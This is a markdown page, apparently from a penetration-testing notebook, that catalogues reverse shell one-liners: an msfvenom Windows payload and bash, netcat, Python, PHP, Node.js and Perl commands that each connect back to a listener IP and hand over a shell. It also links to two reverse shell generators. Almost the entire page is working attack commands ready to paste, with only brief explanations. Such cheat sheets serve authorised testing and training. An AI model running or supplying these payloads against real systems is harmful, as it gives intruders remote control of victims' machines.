---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Reverse Shells

## msfvenom

{% tabs %}
{% tab title="Windows" %}
{% code overflow="wrap" %}
```bash
# Create a reverse shell payload
$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.X LPORT=4444 -f exe -o payload.exe
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Bash

{% tabs %}
{% tab title="classic" %}
```bash
bash -i >& /dev/tcp/10.10.10.10/9001 0>&1
```
{% endtab %}

{% tab title="mkfifo" %}
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.13 1337 >/tmp/f'
```
{% endtab %}
{% endtabs %}

## Netcat

```bash
/bin/nc -nv 192.168.45.155 9090 -e /bin/bash
```

## Python

To create a reverse shell with Python, we will create a socket, connect to our listener, duplicate the input, output, and error descriptors and call `/bin/sh` with `subprocess`.

{% code overflow="wrap" %}
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.155",9090));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
{% endcode %}

## PHP

The below commands instruct PHP to run (`-r`) the command within quotes.

{% code overflow="wrap" %}
```bash
php -r '$sock=fsockopen("192.168.45.155",9090);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("192.168.45.155",9090);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("192.168.45.155",9090);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("192.168.45.155",9090);passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("192.168.45.155",9090);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```
{% endcode %}

## Node.js

The initial command injection will place a malicious file in a world-writable directory (`/var/tmp`) that calls upon Node.js `child_process` and `exec()` functions. The latter will contain the Netcat reverse shell payload.

{% code overflow="wrap" %}
```bash
echo "require('child_process').exec('nc -nv 192.168.45.155 9090 -e /bin/bash')" > /var/tmp/offsec.js ; node /var/tmp/offsec.js
```
{% endcode %}

## Perl

We import the `Socket` module, set up our IP and port, and pass these into a socket call. We then initialize the TCP connection (`connect()`), open channels for `STDIN`, `STDOUT`, and `STDERR`, and call `/bin/bash`.

{% code overflow="wrap" %}
```bash
perl -e 'use Socket;$i="192.168.45.155";$p=9090;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
{% endcode %}

## Resources

{% tabs %}
{% tab title="revshells" %}
{% embed url="https://www.revshells.com/" %}
{% endtab %}

{% tab title="revshellgen" %}
{% embed url="https://github.com/t0thkr1s/revshellgen" %}
{% endtab %}
{% endtabs %}
